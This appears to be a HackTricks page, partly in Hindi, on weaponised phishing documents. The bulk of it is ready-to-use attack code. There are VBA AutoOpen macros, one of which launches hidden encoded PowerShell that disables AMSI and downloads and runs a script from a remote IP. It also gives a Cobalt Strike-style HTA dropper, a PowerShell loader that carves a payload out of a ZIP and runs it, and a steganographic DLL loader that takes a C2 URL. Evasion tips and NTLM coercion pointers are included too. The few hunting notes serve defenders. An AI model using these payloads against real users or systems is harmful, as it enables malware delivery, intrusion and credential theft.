# फिशिंग फाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा सत्यापन करता है। डेटा सत्यापन डेटा संरचना पहचान के रूप में किया जाता है, OfficeOpenXML मानक के खिलाफ। यदि डेटा स्ट्रक्चर पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).

आप निम्नलिखित कमांड का उपयोग यह जांचने के लिए कर सकते हैं कि किन फ़ाइल एक्सटेंशनों को कुछ Office प्रोग्राम्स द्वारा निष्पादित किया जाएगा:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX फ़ाइलें जो किसी दूरस्थ टेम्पलेट (File –Options –Add-ins –Manage: Templates –Go) को संदर्भित करती हैं और जिसमें macros शामिल हैं, macros को भी “execute” कर सकती हैं।

### बाहरी इमेज लोड

पर जाएँ: _Insert --> Quick Parts --> Field_\
_**श्रेणियाँ**: Links and References, **Filed names**: includePicture, और **फ़ाइलनाम या URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

यह संभव है कि macros का उपयोग दस्तावेज़ से arbitrary code चलाने के लिए किया जा सके।

#### Autoload functions

जितने अधिक सामान्य वे होते हैं, उतना ही अधिक संभावना है कि AV उन्हें पहचान लेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

जाएँ **File > Info > Inspect Document > Inspect Document**, जो Document Inspector खोलेगा। **Inspect** पर क्लिक करें और फिर **Remove All** पर क्लिक करें जो **Document Properties and Personal Information** के बगल में होगा।

#### Doc Extension

काम पूरा होने पर, **Save as type** ड्रॉपडाउन चुनें और फ़ॉर्मैट को **`.docx`** से बदलकर **Word 97-2003 `.doc`** कर दें.\
यह इसलिए करें क्योंकि आप **`.docx`** के अंदर macro's को सेव नहीं कर सकते और macro-enabled **`.docm`** एक्सटेंशन के बारे में एक स्टिग्मा है (उदा., थम्बनेल आइकन पर बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए यह **legacy `.doc` एक्सटेंशन सबसे अच्छा compromise** है।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

एक HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (such as VBScript and JScript)** को मिलाता है। यह यूज़र इंटरफ़ेस बनाता है और एक "fully trusted" एप्लिकेशन की तरह निष्पादित होता है, ब्राउज़र की security model की सीमाओं के बिना।

HTA को **`mshta.exe`** का उपयोग करके चलाया जाता है, जो आम तौर पर **Internet Explorer** के साथ **installed** होता है, जिससे **`mshta` dependant on IE** हो जाता है। इसलिए अगर इसे अनइंस्टॉल कर दिया गया है, तो HTAs चलाने में असमर्थ होंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication को मजबूर करना

NTLM authentication को **"remotely" मजबूर करने** के कई तरीके हैं — उदाहरण के लिए, आप ईमेल या HTML में उपयोगकर्ता द्वारा एक्सेस किए जाने वाले **अनदृश्य इमेज** जोड़ सकते हैं (यहाँ तक कि HTTP MitM?). या पीड़ित को उन फाइलों का पता भेजें जो केवल फ़ोल्डर खोलने भर से ही **authentication** को **trigger** कर दें।

**इन विचारों और और भी चीज़ों को निम्नलिखित पृष्ठों में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चोरी ही नहीं कर सकते — आप **NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी अभियानों में एक ZIP भेजा जाता है जिसमें दो legitimate decoy documents (PDF/DOCX) और एक malicious .lnk मौजूद होता है। ट्रिक यह है कि वास्तविक PowerShell loader ZIP की raw bytes में एक unique marker के बाद स्टोर होता है, और .lnk उसे carve करके पूरी तरह memory में रन कर देता है।

Typical flow जो .lnk PowerShell one-liner से लागू होता है:

1) मूल ZIP को सामान्य paths में ढूंढें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और वर्तमान working directory के parent में।
2) ZIP bytes पढ़ें और एक hardcoded marker खोजें (उदा., xFIQCV). marker के बाद की हर चीज embedded PowerShell payload होती है।
3) ZIP को %ProgramData% में कॉपी करें, वहां extract करें, और decoy .docx खोलें ताकि लगता हो कि यह legitimate है।
4) वर्तमान process के लिए AMSI को bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगले स्टेज को deobfuscate करें (उदा., सभी # characters हटा दें) और इसे memory में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk अवशेषों को कम करने के लिए.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. विवरण और तैयार-इस्तेमाल कमांड्स देखें यहाँ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk जो parent/user फोल्डर्स को enumerate करके ZIP ढूंढता है और एक decoy document खोलता है।
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- लंबे चलने वाले business threads जो trusted PaaS डोमेन्स पर होस्ट किए गए लिंक के साथ समाप्त होते हैं।

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. वह stager एक image (अक्सर GIF) डाउनलोड करता है जिसमें unique start/end markers के बीच plain text के रूप में Base64-encoded .NET DLL छिपा होता है। स्क्रिप्ट इन delimiters (जंगली में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>») की खोज करता है, बीच का टेक्स्ट निकालता है, उसे Base64-डिकोड करके बाइट्स बनाता है, assembly को इन-मेमेंट्री लोड करता है और एक ज्ञात entry method को C2 URL के साथ invoke करता है।

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है। मार्कर अभियानों के बीच भिन्न होते हैं।
- AMSI/ETW bypass और string deobfuscation अक्सर assembly लोड करने से पहले लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को known delimiters के लिए स्कैन करें; उन PowerShell प्रोसेसों की पहचान करें जो images तक पहुँचते हैं और तुरंत Base64 blobs को डिकोड करते हैं।

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार मिलने वाला प्रारम्भिक चरण एक छोटा, भारी रूप से obfuscated `.js` या `.vbs` होता है जो archive के अंदर भेजा जाता है। इसका केवल उद्देश्य embedded Base64 string को डिकोड करना और PowerShell को `-nop -w hidden -ep bypass` के साथ लॉन्च करके अगला चरण HTTPS पर बूटस्ट्रैप करना होता है।

Skeleton logic (abstract):
- अपनी फ़ाइल की सामग्री पढ़ें
- जंक स्ट्रिंग्स के बीच Base64 blob का पता लगाएँ
- ASCII PowerShell में डिकोड करें
- `wscript.exe`/`cscript.exe` के साथ `powershell.exe` को invoke कर के चलाएँ

Hunting cues
- आर्काइव किए गए JS/VBS अटैचमेंट जो कमांड लाइन में `-enc`/`FromBase64String` के साथ `powershell.exe` स्पॉन करते हैं।
- user temp paths से `wscript.exe` द्वारा `powershell.exe -nop -w hidden` लॉन्च होना।

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
